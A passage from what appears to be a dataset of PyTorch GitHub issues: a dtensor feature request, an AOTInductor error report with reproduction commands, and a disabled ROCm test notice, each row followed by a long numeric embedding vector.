    ""accumulated_cache_size_limit"",
    ""print_specializations"",
    ""replay_record_enabled"",
    ""cprofile"",  # only wraps _compile, not graph
    ""repro_after"",
    ""repro_level"",
    ""repro_forward_only"",
    ""repro_tolerance"",
    ""same_two_models_use_fp64"",
    ""error_on_recompile"",  # safe because: will throw error
    ""report_guard_failures"",
    ""report_all_guard_failures"",
    ""base_dir"",  # used for minifying / logging
    ""translation_validation"",
    ""translation_validation_timeout"",
    ""translation_validation_no_bisect"",
    ""DEBUG_DIR_VAR_NAME"",
    ""debug_dir_root"",
}
```


cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-5.39911985e-01  1.45769238e-01 -1.97161764e-01 -2.40651578e-01
  2.88391113e-01 -2.63198912e-01  3.76475334e-01 -9.68830734e-02
 -4.11137372e-01 -1.34335563e-01  1.36579946e-01  5.94184846e-02
  3.82996649e-01 -2.18079120e-01  2.32589126e-01  1.13892704e-01
 -6.19334206e-02 -8.01115632e-02 -9.64261293e-02 -6.81829527e-02
 -1.57051399e-01  1.45657748e-01 -1.06064335e-01  3.08825493e-01
  2.52714515e-01  1.05567388e-01 -1.84007555e-01 -4.51159999e-02
 -1.45626158e-01  1.14104763e-01  2.94476986e-01  4.34869379e-01
 -2.69316316e-01  1.32814899e-01  1.51415065e-01  1.98413193e-01
 -1.54152095e-01 -1.24042071e-01 -1.38021097e-01 -1.27078414e-01
 -9.67277493e-03 -8.25532526e-02  1.06652096e-01 -2.15339005e-01
 -1.77798346e-01 -7.88755640e-02 -2.84880161e-01  2.85154402e-01
 -2.94667333e-01 -2.23928958e-01 -6.94693550e-02  6.02066750e-03
 -2.23517209e-01 -4.38660562e-01 -2.23104060e-02  2.49754265e-02
  8.12084898e-02  2.91585445e-01 -9.49384868e-02 -1.09540084e-02
  6.99390322e-02 -2.23099813e-01  1.06929734e-01  1.28400967e-01
 -1.41915232e-01 -1.75431669e-01  1.45721555e-01  5.94900660e-02
  4.38927978e-01  1.06326148e-01  3.50966960e-01 -3.00286442e-01
 -2.65825659e-01 -3.51512402e-01  1.47813976e-01  1.35492861e-01
 -3.23068738e-01  1.68157905e-01  1.09720826e-02 -1.26293659e-01
 -9.14311260e-02 -1.00274794e-02  9.67838317e-02 -2.88140684e-01
  1.77360564e-01 -8.77633691e-02  9.92865190e-02 -1.91245228e-01
  3.58973682e-01  6.31563216e-02  4.09550786e-01 -2.26224571e-01
  1.72819585e-01  6.10476881e-02  2.13416174e-01  3.85683894e-01
  6.21419307e-03  5.67393564e-03  4.37847041e-02 -9.21292305e-02
 -2.48393089e-01 -1.21247761e-01 -8.59827399e-02 -1.16769075e-01
 -1.43997967e-01 -2.27740899e-01  1.87436655e-01  2.13391602e-01
  7.84198269e-02 -7.41937608e-02  1.33900195e-01 -2.74658680e-01
 -1.82542615e-02  7.83435535e-03  6.01704493e-02  5.20757437e-02
  4.88406904e-02 -2.05149636e-01 -1.18152320e-01 -1.98916122e-02
  9.35616940e-02 -1.00089848e-01  3.55751812e-02  2.72479832e-01
  2.64269829e-01  3.87114808e-02 -1.92660674e-01 -7.81424493e-02
  7.47259408e-02  9.99844074e-02 -6.86542690e-02  7.93834776e-02
  2.96074338e-03  1.67490736e-01  1.31980464e-01 -1.67552736e-02
 -8.29790235e-02 -2.45270133e-01 -2.62566805e-01  2.42448151e-01
 -1.63769037e-01  2.01246411e-01 -8.71649086e-02 -5.10537267e-01
  1.50827602e-01  1.32136703e-01 -1.25750124e-01 -1.01635098e-01
  7.67288636e-03 -1.23741440e-02 -9.64802653e-02 -1.73717603e-01
 -2.02350378e-01  7.83917964e-01  1.09543487e-01  1.47368461e-01
  8.85208398e-02  1.36994421e-01  3.86419117e-01 -2.42172182e-01
  1.87862128e-01  4.83214289e-01  2.31007054e-01  1.15176588e-02
  2.71218345e-02  1.77248213e-02 -4.49844271e-01 -2.03715742e-01
 -8.65944177e-02  2.18522742e-01 -4.05470818e-01 -1.67822212e-01
  2.21106112e-01 -1.38566002e-01  2.76467532e-01 -1.52046964e-01
 -1.29124388e-01 -3.14526528e-01  2.52058893e-01  3.99048537e-01
  1.58618465e-01  2.88113087e-01  2.52723724e-01 -9.06649530e-02
 -7.90737569e-04  4.10922080e-01  2.72702873e-01  1.03875913e-01
 -2.65920520e-01  2.00647771e-01 -3.55630577e-01  3.95504609e-02
  2.62279749e-01  4.67637479e-02  9.96467918e-02  2.90265828e-02
  1.32866055e-01  3.47734421e-01  7.74559826e-02 -7.44827092e-04
 -5.20142168e-02  5.26848733e-01 -5.63696548e-02  9.92207229e-02
  1.35807961e-01  4.09368500e-02  3.76771241e-02 -2.84040928e-01
 -2.79604942e-01  2.24626154e-01 -3.11688483e-01  7.04050437e-03
  7.59821907e-02 -2.87549496e-01  1.34852864e-02  2.75690496e-01
 -3.09965551e-01 -6.65456131e-02  4.03102040e-02  1.69482678e-01
  9.47204679e-02 -1.75559372e-01  6.80587813e-03 -3.21136117e-01
 -1.16530880e-01  2.48913988e-01 -1.67304456e-01 -2.68701278e-02
 -1.41482040e-01  7.57751986e-02 -5.56968525e-02 -2.64342695e-01
  4.46060777e-01  1.33464202e-01  3.64029482e-02 -1.21319629e-01
 -2.88256072e-02 -1.71902001e-01  5.89729548e-02 -1.16619237e-01
 -1.05930775e-01 -3.90926540e-01 -5.08485101e-02  8.36439207e-02
  5.91371506e-02  8.58646035e-02 -2.38032624e-01 -1.58379078e-01
 -3.11495453e-01  1.10289276e-01  1.27607346e-01 -3.84356141e-01
  2.58470327e-01  9.61714610e-02  2.33942010e-02  1.50483102e-01
  8.63872319e-02  1.19882613e-01  3.89688686e-02 -2.44347855e-01
  2.77160078e-01  3.39026272e-01 -8.61006379e-02  7.48303384e-02
  1.76922113e-01  1.03704184e-01 -2.21463308e-01  3.27108502e-01
 -1.52378932e-01 -8.28569382e-02  2.44407773e-01 -2.93936908e-01
 -4.79805730e-02  1.24922376e-02  3.79242957e-01 -1.07160524e-01
  3.89121354e-01 -5.05918384e-01 -1.56170562e-01 -2.53505781e-02
  5.16895950e-03  8.28769878e-02 -9.29676741e-02  1.33042201e-01
  2.39449218e-01 -4.22216952e-01 -1.46712050e-01 -2.46635795e-01
 -1.38585493e-01 -8.78181458e-02 -2.20727235e-01  1.26130790e-01
 -1.82507753e-01 -9.35992151e-02 -9.68216732e-03  2.59187758e-01
  2.35597789e-01 -2.03368112e-01 -6.42681345e-02  4.35332395e-02
 -2.61342645e-01 -9.26335752e-02  1.19878978e-01 -2.43081599e-01
 -6.83204830e-02 -4.69437316e-02 -8.38759094e-02  2.12209113e-02
  6.54095948e-01 -5.68028569e-01 -6.69732839e-02  4.11920130e-01
  2.13161446e-02  4.63069856e-01  4.75761592e-02  6.16381913e-02
 -9.49163213e-02  7.65677094e-01 -1.06841609e-01  3.07434946e-02
 -1.68126971e-02 -1.76533490e-01 -6.36120886e-02  1.63260072e-01
  4.19084042e-01  3.81069839e-01 -5.32507539e-01 -7.27467090e-02
 -8.95331800e-02  1.39302820e-01  1.51032507e-01  4.46601845e-02
 -2.90750861e-01 -6.45775497e-02 -9.13037639e-03 -4.72253785e-02
 -6.74282461e-02  7.66731277e-02 -2.28958093e-02 -2.16690093e-01
  2.81921327e-02  2.87365496e-01  3.16822939e-02 -2.91878223e-01
 -2.59746492e-01 -1.52441069e-01 -4.04558927e-02  4.39178884e-01
 -5.87637350e-02 -1.03822127e-01 -1.32969092e-03  5.34981042e-02
 -2.30003133e-01 -8.29025824e-03 -2.61641592e-01  2.24150509e-01
 -3.11005581e-03  7.12428018e-02 -7.29394332e-02  3.90244573e-02
 -3.75259519e-01  2.40301210e-02 -5.44283569e-01  2.24295452e-01
  3.27938199e-02 -5.14290780e-02  9.44205821e-02 -1.56230330e-01
 -2.43835017e-01  4.18309212e-01 -4.60713327e-01  1.05205737e-01
  2.13332456e-02  1.67086810e-01  1.77377418e-01 -2.88223233e-02
  2.82285791e-02  2.71146204e-02  1.34583876e-01  1.40031934e-01
 -2.29066372e-01  2.75745392e-01  1.21816397e-01 -1.39575526e-02]"
Can we use dtensor.local = local_tensor to ovveride dtensor ? oncall: distributed module: dtensor,"### ðŸš€ The feature, motivation and pitch

Hi,torch team
Distributed tensors can be used as distributed containers, e.g., define a **dtensor_stroe**, storing the values of **dtensor_a.local * dtensor_b.local()**  at different ranks
dtensor.local = local_tensor

### Alternatives

_No response_

### Additional context

_No response_

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False,"[-0.06092377 -0.35494292 -0.45538732 -0.07631659  0.04234026 -0.4966908
  0.00620503  0.11366335 -0.53588706 -0.215765    0.14965335 -0.45597598
 -0.40824148  0.2333568  -0.18035325  0.21226132 -0.12225465  0.20330976
 -0.11879125 -0.230456   -0.00729289 -0.11980713 -0.00532965  0.18033677
 -0.06836581  0.2798661  -0.0225101  -0.09621985  0.38004702 -0.03504988
  0.25271264 -0.09488952 -0.25169218  0.08817576 -0.41575688  0.2799831
 -0.31650627  0.07080057 -0.20189807  0.12518615  0.17293248  0.09442635
  0.02905039  0.04062477 -0.02185145 -0.13946535  0.02289558 -0.02454954
 -0.21193625 -0.2933293   0.13209653 -0.12027214 -0.28860077 -0.05541459
 -0.2790908  -0.34021357  0.17756343 -0.15944803  0.1327747  -0.2886515
 -0.0761262  -0.25487322  0.15672587  0.32145116 -0.2573336  -0.34490585
  0.31297615  0.1553567   0.09456111  0.03105552  0.17878227 -0.00570597
 -0.11206968 -0.19538957  0.31398365  0.21604705 -0.0225097   0.30497077
  0.16362709 -0.29051602  0.293367    0.32591566 -0.04158362 -0.19987002
 -0.08336674  0.01022834  0.17064488 -0.04021732  0.5738109  -0.07341249
  0.23741889  0.2763102  -0.32976168 -0.03767837  0.04530624 -0.02048812
  0.5304753   0.03608206 -0.2373539   0.02076048 -0.6050304  -0.19754381
 -0.45689955  0.1816892   0.17186129  0.0014904   0.09692948  0.074788
  0.12713853 -0.03127294  0.09292976  0.19424516 -0.09183567 -0.21025975
 -0.05105682 -0.5059556  -0.3255601  -0.09051244 -0.218311   -0.00156492
 -0.1057379   0.01979343 -0.13946125  0.16075814  0.54038036  0.34336996
 -0.00653123  0.05058417  0.15235272  0.20980297  0.14158155 -0.13846308
  0.15823624 -0.16880444  0.19106215  0.3614137  -0.10906532 -0.35012686
 -0.39661536  0.16446899 -0.09504169  0.16622871 -0.04101909 -0.38128066
  0.33461827  0.14555949 -0.08749514 -0.26351708 -0.13470101  0.14688426
 -0.1066836   0.06815115 -0.25965434 -0.00366112  0.1780617   0.10565963
 -0.06874554 -0.11679231 -0.0888204  -0.25625765  0.26671153  0.3236946
  0.06130903  0.3749887   0.09718545  0.15548947 -0.25836778 -0.11373672
 -0.14350694  0.17076156 -0.10128467 -0.27493834 -0.2715795   0.05325933
  0.16512361 -0.01626804 -0.1421226  -0.33543882 -0.32553944  0.41044715
  0.10268554 -0.05176749  0.4426344   0.17071496 -0.398786    0.18914787
  0.30321956 -0.14723828 -0.4195467  -0.15287416 -0.1360299  -0.13289022
  0.19261718 -0.00345909 -0.07627957 -0.29111448  0.32083067 -0.39362416
  0.03893243  0.09705598 -0.2395712  -0.09361187  0.01781038  0.26879448
  0.42086536  0.04585425 -0.17071947 -0.4231852  -0.38091588  0.28808767
 -0.1257451  -0.0197503   0.19315673 -0.1243771  -0.02175548 -0.25425297
 -0.08059261  0.06460521 -0.4752897  -0.01700957 -0.05584986 -0.02510712
  0.26448235 -0.32769984  0.00384445  0.19591336 -0.24888693 -0.02937795
 -0.04592914  0.23580143 -0.04758219 -0.09220162  0.14872123  0.16325204
 -0.0481814   0.03571098 -0.22334114 -0.13194013 -0.14056532  0.01941432
 -0.29091564  0.14037324 -0.04417971 -0.10275709 -0.10252036  0.53336704
 -0.53407776 -0.04536821 -0.10063635  0.3029073  -0.25808328  0.3659715
 -0.23299435 -0.07433256  0.55622786 -0.12734695  0.17408308  0.14062762
 -0.0545391   0.07985677  0.25666142  0.17341417 -0.12535383  0.5680156
  0.11178306  0.13467135 -0.24557802  0.16234455 -0.16765395 -0.00234589
 -0.17430463 -0.325756    0.20414472 -0.0527163  -0.06319925 -0.3231061
  0.13411118 -0.0460015  -0.09646776 -0.15632524  0.4233435   0.18841705
 -0.05820417 -0.13441545  0.02781566 -0.34528315 -0.03806774  0.22348641
 -0.11458069  0.03683946  0.02271651  0.13979168  0.2447459   0.00153473
 -0.17216352  0.04590228  0.3046593  -0.17089514  0.04235652  0.01591982
  0.4532679  -0.1441284   0.09742648 -0.3065397  -0.33294475 -0.3800139
  0.54903316  0.28855032  0.40137485 -0.16643868  0.4547155  -0.0275956
  0.13007344  0.4303935  -0.08131659  0.2450112  -0.00803158  0.4055761
  0.4475979  -0.03952843  0.2243087  -0.05491672 -0.4608516   0.35376984
  0.0698046   0.1696583  -0.23225099 -0.39394617 -0.22621796  0.37455398
  0.05805394 -0.22253463  0.36789283 -0.09048288  0.12806211 -0.26315445
 -0.30179474  0.4390029  -0.15149185 -0.09749416 -0.25102597  0.05496332
  0.14630482 -0.08433172 -0.02894884 -0.35050437  0.12395438  0.2655639
  0.18048438  0.0555698   0.13212687  0.28050637 -0.0159407   0.26624754
  0.43393004  0.21687457 -0.21451545 -0.08972238 -0.06454336  0.87034374
 -0.268493    0.36937732  0.10396032 -0.04653256  0.0571987   0.00212879
 -0.04017076 -0.06571506  0.38681322  0.38813877 -0.09806588  0.38209295
 -0.01388836  0.25010815  0.28586042 -0.16992706 -0.02558707  0.05457992
  0.07374654 -0.24625829 -0.13790219  0.07785487 -0.2723278   0.08976221]"
"[AOTInductor] 14K models: expected inputs vector size to be 1, but got 3 triaged oncall: pt2","395 errors like: RuntimeError: expected inputs vector size to be 1, but got 3 (example ./generated/test_LoSealL_VideoSuperResolution.py:make_dense # pytest ./generated/test_LoSealL_VideoSuperResolution.py -k test_042)

Repro:
```
git clone https://github.com/jansel/pytorch-jit-paritybench.git
# set PYTHONPATH like the following example
export PYTHONPATH=/home/binbao/local/pytorch-jit-paritybench/paritybench:$PYTHONPATH
python main.py --compile_mode=aot_inductor -e ./generated/test_LoSealL_VideoSuperResolution.py
```

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305",False,"[-1.80718660e-01 -3.16948354e-01 -2.05254376e-01 -1.63590200e-02
  1.99805126e-02 -2.65498757e-01 -2.03689307e-01  2.11235791e-01
 -3.17644566e-01  4.85473201e-02  1.78252354e-01 -5.62180988e-02
 -8.46823454e-02  7.43376389e-02 -4.96161059e-02  1.38572708e-01
 -2.52177894e-01 -2.38086402e-01  7.13718832e-02  1.87450558e-01
  2.29794666e-01 -1.41111329e-01  9.81352404e-02  5.73156402e-02
  2.79772937e-01  2.14897349e-01  2.10093446e-02 -2.67239511e-01
  6.58221617e-02 -1.30104393e-01  1.51567429e-01 -3.14773917e-02
  4.16457765e-02 -2.10737318e-01  2.56304681e-01 -2.74002612e-01
 -5.52285314e-02 -2.88389921e-01 -1.74068555e-01  1.54555678e-01
  2.02139527e-01  3.10339004e-01  6.82426915e-02  1.75060499e-02
 -2.09641144e-01 -3.71244073e-01 -1.88748509e-01  3.07975531e-01
 -2.10195482e-01 -1.72389954e-01 -5.24084866e-02 -1.96977779e-02
 -2.91333586e-01 -1.96946383e-01 -5.79602420e-02 -3.17270756e-01
  5.69448248e-03  2.08852701e-02  1.10354424e-01 -7.13170320e-03
  2.52702311e-02 -5.38296774e-02  1.60113931e-01  8.44008178e-02
  1.48903087e-01  7.22205266e-02 -8.00819416e-03  7.12092072e-02
  2.09465429e-01 -2.05200464e-02 -6.59212917e-02  5.57100289e-02
 -1.81444004e-01 -1.22626685e-03 -5.60522079e-04  4.63637747e-02
 -3.00898433e-01  3.93975079e-01  2.85729878e-02 -8.63524973e-02
 -1.36537284e-01 -4.43670042e-02  5.41594587e-02  1.27423614e-01
  6.45725578e-02 -7.14696720e-02  1.44106269e-01  1.33264273e-01
  3.24886084e-01 -3.73636410e-02  2.14445651e-01  2.68731952e-01
 -2.69384205e-01  5.32459497e-01  3.02378163e-02  1.43216342e-01
  2.20127404e-02 -2.98902631e-01 -2.76570432e-02 -1.59446210e-01
  7.39703029e-02 -2.27323949e-01 -9.50219855e-02  3.32449555e-01
 -6.45783991e-02  1.17967008e-02  2.16706485e-01  2.37613425e-01
  2.65889972e-01  1.76186860e-01  5.94032109e-02  8.19288492e-02
  6.62358180e-02  2.02582911e-01  1.41783714e-01  2.18333334e-01
 -1.18621364e-01  1.52841344e-01 -2.81079590e-01  3.35841060e-01
  4.30230051e-02 -2.93735862e-01  1.93328813e-01  2.03313440e-01
  4.41657186e-01 -3.88038829e-02 -3.80500257e-02  1.04398385e-01
 -2.82430183e-02  8.13537091e-03  4.03560281e-01  3.76115553e-02
 -1.21859387e-01 -1.14850916e-01  1.08739324e-01 -1.17535681e-01
 -2.85309792e-01 -2.98732638e-01 -3.15043360e-01  1.18978340e-02
 -2.13851675e-01  1.58862360e-02 -7.37066846e-03 -2.80205011e-01
  4.02901135e-02  4.07870412e-01 -2.99488485e-01  2.39910409e-01
 -8.71937815e-03  1.70090377e-01 -7.82052279e-02 -1.67173699e-01
 -9.55388620e-02  1.38061613e-01  6.93624839e-02  1.91594753e-02
  4.93344925e-02 -6.30601794e-02  1.42906860e-01 -2.87304968e-01
 -9.32866335e-02  1.05370969e-01  1.10743687e-01 -1.94793805e-01
  2.04259753e-01 -9.20607075e-02 -4.03534502e-01 -1.32395983e-01
 -1.04779312e-02 -1.03308141e-01 -1.63346902e-01 -5.92176169e-02
 -7.27331862e-02 -2.91831553e-01  3.78718495e-01 -2.37519622e-01
 -2.57787824e-01 -2.51999319e-01 -1.55455079e-02  2.00700700e-01
  3.10433269e-01  1.78982258e-01  1.22541353e-01 -8.58927295e-02
  1.09608509e-02 -5.28137609e-02  2.98666835e-01 -4.65082265e-02
  2.17973180e-02 -1.38062298e-01  2.12791190e-02  4.23146300e-02
 -1.84846938e-01 -1.30837798e-01  5.05151078e-02 -2.93669134e-01
 -4.03781645e-02  3.34673762e-01  1.25966370e-01  1.90485567e-01
 -8.10612589e-02 -8.27284828e-02 -5.59911616e-02 -1.22371346e-01
  1.67042017e-01  1.78774130e-02 -2.30944693e-01  8.58079940e-02
 -3.61986876e-01 -1.68701857e-02 -8.47199112e-02 -4.95934635e-01
 -8.23365822e-02 -2.80140400e-01 -4.44496632e-01  1.75446928e-01
  2.73830444e-02  5.06894067e-02  2.35776946e-01  2.14741081e-01
 -1.07872739e-01 -2.04991341e-01 -1.77336559e-01 -2.37533510e-01
 -2.13748306e-01  2.03284889e-01 -7.65455663e-02 -8.44061151e-02
 -1.57271832e-01  5.27729467e-02 -4.45680246e-02  1.29302114e-01
  6.55033827e-01 -3.34390774e-02 -3.24896462e-02  2.27379233e-01
 -7.99186453e-02 -2.61381924e-01  1.36688426e-01  1.09112404e-01
 -6.60238042e-02 -2.73929775e-01  1.05342574e-01 -4.58527356e-01
  3.87041122e-02 -2.92424262e-01  8.38227570e-05 -3.06929171e-01
 -1.80478334e-01  5.36763191e-01 -3.53311390e-01 -1.72913060e-01
  4.16922331e-01 -1.46535337e-01  2.59562314e-01 -1.83191150e-01
 -1.46999761e-01  1.43393815e-01  1.42524436e-01 -1.10614941e-01
  1.38760582e-01  1.02948830e-01 -1.69629201e-01  3.62520278e-01
  2.10345536e-01  5.75731546e-02 -1.91337094e-01  6.20955266e-02
  3.25652137e-02 -2.77202547e-01  5.51266909e-01 -3.72982919e-01
  4.32004273e-01  8.92693698e-02  1.03665188e-01  7.46097267e-02
  5.23050904e-01  9.28397179e-02  5.37219271e-02 -4.22223359e-02
  2.28226066e-01  5.20303071e-01  8.41400214e-03  1.91313803e-01
  7.84621984e-02 -3.75389457e-01 -1.47852406e-01 -2.27422297e-01
 -3.50380480e-01 -4.04492766e-02 -8.18070993e-02 -9.80715603e-02
  1.75043792e-01  1.58799142e-01  1.48930214e-03  2.95582414e-01
 -2.19800510e-02 -4.23334632e-03  5.71777448e-02 -1.73913818e-02
 -2.72825003e-01  2.34438226e-01  2.04236627e-01  4.61991318e-02
 -3.49633634e-01  5.28045073e-02  1.47983074e-01 -3.09556425e-02
  5.59642613e-01 -2.68939674e-01  1.83821470e-01 -4.25430872e-02
 -4.57649529e-02  4.36032534e-01 -1.21727146e-01  1.25641435e-01
 -7.32624829e-02  4.23139393e-01  4.63609174e-02 -1.27572685e-01
 -6.23511747e-02 -1.01116717e-01 -4.57648456e-01  1.42158657e-01
  4.79710340e-01 -4.95379940e-02 -3.30665886e-01  1.39033888e-02
  7.84661248e-03 -1.74551606e-02  1.88500747e-01  4.37780097e-03
  5.35597950e-02  1.09508246e-01  1.54621214e-01 -3.69615048e-01
 -1.22911572e-01  1.65731594e-01 -4.22406718e-02 -4.52274308e-02
  5.16792610e-02  1.12394258e-01 -5.64310551e-02 -1.53709635e-01
 -1.18142977e-01 -1.03623062e-01  3.61402810e-01  3.63738358e-01
 -3.57403271e-02  1.87526364e-03  6.95084035e-02  1.17777929e-01
 -4.88224089e-01 -5.78436702e-02 -1.22286797e-01  4.03949380e-01
  2.28303969e-02  6.22027367e-02 -6.15103394e-02  8.51473331e-01
 -1.13543153e-01  7.46312737e-02 -2.37347946e-01 -6.57936186e-02
  2.29575321e-01  6.16428927e-02 -2.52221733e-01 -2.83842862e-01
 -6.16430342e-02  3.71694751e-03 -2.39246547e-01  2.62005091e-01
 -3.34162414e-01  1.44872785e-01  5.98942712e-02 -1.46522298e-01
 -1.14331320e-02  3.55165005e-02 -1.60766058e-02  9.85963941e-02
  1.29882563e-02  2.23189294e-02 -1.55056924e-01  8.30899179e-02]"
"DISABLED test_max_autotune_cutlass_backend_regular_mm_dynamic_False_max_autotune_gemm_backends_ATen, Triton, CUTLASS (__main__.TestDoBench) module: rocm triaged skipped","Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-9.05613601e-02  3.53271589e-02 -8.93836692e-02 -1.31566033e-01
 -4.21666764e-02 -4.57277149e-02  2.70583868e-01  1.71763912e-01
 -6.15613282e-01 -2.15229988e-01  2.33475208e-01 -3.70094359e-01
  1.86447337e-01  2.68233512e-02 -4.67097402e-01  2.18168736e-01
 -5.46504110e-02  7.62516186e-02  1.32350326e-01 -4.65386622e-02
 -1.00300103e-01 -8.97527337e-02 -3.85007203e-01  1.46474138e-01
 -2.25124076e-01  2.68422842e-01 -3.18989187e-01  2.35063151e-01
 -2.54039586e-01  1.76858574e-01  2.35068649e-02  1.50132775e-01
  1.49243265e-01  1.68672502e-02  4.00102198e-01 -1.65431455e-01
 -3.10707092e-01 -2.84294546e-01 -4.89994772e-02 -1.14160210e-01
 -7.50470534e-02 -4.14590538e-02 -2.49756500e-04  1.45325869e-01
  7.72971511e-02  3.39764804e-02 -1.12073489e-01  2.12038755e-01
 -3.77296545e-02 -7.82628506e-02  1.53805017e-01  6.07932769e-02
 -3.43478888e-01 -2.98856199e-01 -7.66118765e-02  1.45230308e-01
  1.65063486e-01  2.88310260e-01  7.71641210e-02  3.01973760e-01
  1.78425461e-01  4.62183543e-02 -6.56407923e-02 -2.00641006e-02
 -6.95745200e-02  3.12254548e-01 -1.31159306e-01 -2.90207386e-01
  4.00377393e-01  1.58336192e-01 -5.26881032e-03 -1.96039230e-02
 -2.31981188e-01  2.89795935e-01  2.05014586e-01  2.30784714e-01
 -2.50081360e-01 -1.81750804e-01 -2.77275741e-01 -1.99726984e-01
 -3.26049089e-01 -3.46218795e-02  4.05754242e-03 -3.11898917e-01
  4.56466764e-01 -1.90528527e-01  2.39756078e-01 -2.76159123e-02
 -2.56055854e-02  1.85125083e-01  4.38828737e-01  3.83223966e-02
  1.95875585e-01  1.25753403e-01  7.70443827e-02 -9.25622433e-02
  1.40452877e-01 -1.94321305e-01 -4.06718642e-01  1.59914166e-01
  1.47469208e-01 -1.77703440e-01 -2.63736844e-01  2.22548693e-01
 -3.32693458e-01 -5.75620607e-02  2.44659767e-01 -7.86195248e-02
 -4.61025760e-02  1.37655929e-01  2.03183383e-01 -1.14693187e-01
  2.60345526e-02  3.35610032e-01 -5.25860563e-02  2.11864248e-01
 -1.89274982e-01 -1.46595135e-01  6.36198744e-02  4.31637585e-01
 -5.17905504e-02 -3.29628378e-01  1.82143718e-01 -3.06583978e-02
  2.30525672e-01 -1.85741082e-01  5.49683049e-02  1.38896927e-02
  1.93560943e-02 -7.63593391e-02  1.83027521e-01 -1.75068304e-01
 -4.25781831e-02  4.11957549e-03 -3.02106053e-01  2.34424740e-01
 -3.00118010e-02 -2.38322243e-01  1.27490252e-01  2.20649511e-01
 -4.08375859e-01  1.26556724e-01  2.40598954e-02  9.68067721e-02
  1.28289640e-01  7.34722167e-02 -5.30082464e-01  1.56857148e-01
  4.07416336e-02 -8.70939642e-02  1.39490291e-02 -1.02482706e-01
  2.51634046e-03  4.55758810e-01  1.01374770e-02  2.33015828e-02
  6.46865368e-01  1.22136764e-01 -1.57380998e-01 -1.93380147e-01
 -2.41482258e-03  5.58023863e-02 -1.25763476e-01 -1.11997008e-01
  3.14616680e-01  6.67079166e-03 -3.68930221e-01  1.44948512e-01
 -1.04614019e-01  3.80300850e-01  3.35317850e-01  1.43061936e-01
  6.64448440e-02 -1.68511063e-01  4.47425470e-02 -2.18558729e-01
  1.06940001e-01 -2.65046328e-01 -1.86220407e-01  8.99761915e-02
 -3.32081132e-02  6.81737885e-02  3.91069263e-01 -6.98202103e-02
 -2.60285586e-01  2.22363085e-01 -6.52362034e-02  1.96822971e-01
  1.14237070e-01 -8.92034546e-02 -1.00977361e-01  1.10467374e-01
  1.70650914e-01  4.04420048e-02 -3.20477605e-01 -2.10620835e-01
  1.04761720e-01 -1.87183589e-01  3.71385403e-02 -5.48681840e-02
  8.78914744e-02  1.58150166e-01  2.19373517e-02 -4.79878783e-01
  8.88315812e-02  3.67640592e-02 -2.35007092e-01 -4.38050598e-01
  2.28120014e-01  3.27607840e-01 -1.65487036e-01 -4.97610271e-01
 -1.83539212e-01 -1.74764737e-01 -7.21731707e-02  5.37971817e-02
  1.78946406e-01 -8.93079713e-02 -2.44151384e-01 -4.56993356e-02
 -1.45587930e-02 -1.77553102e-01 -1.84999436e-01 -3.47985804e-01
 -3.36106300e-01 -4.03906144e-02 -7.88092390e-02  1.34612501e-01
 -1.31972376e-02  5.47483042e-02  6.19822666e-02  1.18556514e-01
  9.56475213e-02  4.97074947e-02  3.84285539e-01 -4.17293683e-02
 -1.02813736e-01 -2.95685798e-01 -1.55895531e-01  1.55348569e-01
 -1.51230708e-01 -7.75874108e-02 -1.24151677e-01  3.88175324e-02
  1.37045175e-01  1.52484655e-01 -2.27355167e-01 -1.47417393e-02
 -3.14885974e-01  1.91718727e-01 -2.30822176e-01 -4.47511449e-02
  1.36468187e-01  2.03127176e-01  9.00870934e-02  3.14386159e-01
 -1.43024266e-01  1.06961086e-01  6.31935820e-02 -1.27529487e-01
  1.57171398e-01  2.63845146e-01 -1.21768884e-01  7.32786894e-01
  3.44000548e-01  2.14992791e-01 -3.12424332e-01 -3.88286114e-02
 -1.83675978e-02 -8.40608627e-02  1.29659966e-01 -4.23637152e-01
  2.14414850e-01 -7.15532377e-02  4.35914993e-01 -1.12933636e-01
  3.36949259e-01  4.87949103e-02 -2.51549780e-01  6.44373298e-02
  4.07690331e-02  2.20736474e-01 -1.13162547e-01  2.66758800e-01
  2.29488105e-01 -5.78425787e-02 -4.82046045e-02 -3.79027158e-01
 -1.98176607e-01 -2.05828011e-01  6.02005376e-03  3.64764363e-01
  2.39129022e-01 -1.35914117e-01 -3.48188698e-01  1.25298098e-01
  2.94231415e-01 -6.93722069e-03  9.02245492e-02 -2.55626105e-02
 -3.36943924e-01  1.42460346e-01  1.69591337e-01 -4.38671499e-01
 -1.53534606e-01 -6.82866126e-02  1.42298311e-01  3.36293280e-01
  1.14293687e-01 -3.38540077e-01 -1.29260704e-01  2.44859025e-01
  6.35867193e-02  4.01745915e-01 -3.07944939e-02  4.65025753e-02
  4.62027043e-02  3.41782808e-01  6.44628853e-02 -2.92958617e-02
  2.63816416e-01 -2.18031198e-01 -2.16027111e-01  3.78907263e-01
  6.26587793e-02  2.98561156e-01 -2.90235430e-01 -1.73183158e-01
 -3.78487073e-02 -2.86545217e-01  1.72086596e-01 -1.75487578e-01
 -3.64794105e-01  9.21865851e-02 -1.92149162e-01 -1.43243611e-01
 -4.58591878e-02  5.64844549e-01  2.74196863e-01 -3.75254601e-01
 -1.50957197e-01  2.00737529e-02  1.78513467e-01 -1.53355226e-01
 -2.14052528e-01  1.92748755e-02  2.00540036e-01  4.16838467e-01
  1.14805391e-02  1.82356238e-01  1.24065995e-01  3.76451612e-02
  3.16249207e-02 -6.95675332e-03  3.44048440e-03  4.18712616e-01
 -4.09921035e-02  2.36965895e-01 -5.93204238e-02  1.35118157e-01
  3.08652446e-02 -3.04024875e-01 -7.05162108e-01 -4.89007235e-02
  8.13576877e-02 -3.42028290e-01  2.16492638e-03 -1.22493282e-02
  2.89686024e-01 -1.95369497e-03 -2.39593714e-01  5.39280921e-02
 -1.23174898e-01 -1.21120788e-01  3.39397103e-01 -2.73379423e-02
  5.37230968e-01 -9.72477645e-02 -1.78618491e-01  2.12181553e-01
  6.53144494e-02 -1.43543199e-01 -6.49109930e-02  3.77238281e-02]"
